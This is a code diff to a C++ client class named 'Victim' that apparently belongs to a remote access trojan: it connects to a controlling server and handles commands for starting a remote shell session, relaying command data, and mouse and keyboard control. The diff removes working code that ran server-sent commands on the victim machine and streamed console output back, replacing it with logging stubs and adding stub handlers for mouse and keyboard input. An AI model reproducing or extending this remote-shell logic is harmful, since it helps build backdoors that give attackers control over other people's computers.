@@ -1,5 +1,6 @@
 #include "victim.hpp"
 #include <thread>
+#include <iostream>
 #include "../commands.hpp"
 
 Victim::Victim(std::string inHId)
@@ -11,7 +12,7 @@ Victim::Victim(std::string inHId)
 int Victim::runVictimProcess()
 {
 	while (!connectServer())
-		sf::sleep(sf::seconds(2));
+		sf::sleep(sf::seconds(5));
 
 	while (true) {
 		sf::Packet p;
@@ -30,51 +31,34 @@ int Victim::runVictimProcess()
 		p >> reqId >> cmd;
 
 		//start ssh session
-		if (cmd == Cmd::START_SSH) {
-			if (cmdSession != nullptr) {
-				std::cerr << "cmd is not nullptr (unable to start session)\n";
-				continue;
-			}
-
-			try {
-				cmdSession = new CmdSession();
-				sendCmdDataThread = new std::thread([this]() {
-					sendCmdData();
-				});
-			}
-			catch (std::exception& e) {
-				std::cerr << "error creating cmd: " << e.what() << "\n";
-				continue;
-			}
-
+		if (cmd == uint8_t(Cmd::START_SSH)) {
 			isSshActive = true;
+			std::cout << "code " << int(cmd) << ": start ssh\n";
 		}
 		//end ssh session
-		else if (cmd == Cmd::END_SSH) {
-			if (cmdSession == nullptr) {
-				std::cerr << "cmd is already nullptr (unable to end session)\n";
-				continue;
-			}
-
+		else if (cmd == uint8_t(Cmd::END_SSH)) {
 			isSshActive = false;
-			delete cmdSession;
-			cmdSession = nullptr;
-
-			sendCmdDataThread->join();
-			delete sendCmdDataThread;
-			sendCmdDataThread = nullptr;
+			std::cout << "code " << int(cmd) << ": stop ssh\n";
 		}
 		//receive ssh data
-		else if (cmd == Cmd::SSH_DATA) {
+		else if (cmd == uint8_t(Cmd::SSH_DATA)) {
 			std::string data;
 			p >> data;
 
-			if (cmdSession == nullptr) {
-				std::cerr << "cmd session not initialized\n";
-				continue;
-			}
+			std::cout << "code " << int(cmd) << ": ssh data #" << data << "#\n";
 
-			cmdSession->sendCommand(data);
+			std::string resStr = "received and processed #" + data + "#\n";
+			sf::Packet res;
+			res << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << resStr;
+			server.send(res);
+		}
+		//receive mouse position data
+		else if (cmd == uint8_t(Cmd::SSH_MOUSE)) {
+			std::cout << "code " << int(cmd) << ": mouse data\n";
+		}
+		//receive keyboard state data
+		else if (cmd == uint8_t(Cmd::SSH_KEYBOARD)) {
+			std::cout << "code " << int(cmd) << ": keyboard data\n";
 		}
 		//unknown command
 		else {
@@ -144,16 +128,4 @@ bool Victim::connectServer()
 	res >> myId;
 	isInitialized = true;
 	return true;
-}
-
-void Victim::sendCmdData()
-{
-	while (isSshActive) {
-		std::string output;
-		if (cmdSession->readConsoleOutput(output)) {
-			sf::Packet res;
-			res << uint16_t(0) << uint8_t(Cmd::SSH_DATA) << output;
-			auto _ = server.send(res);
-		}
-	}
 }
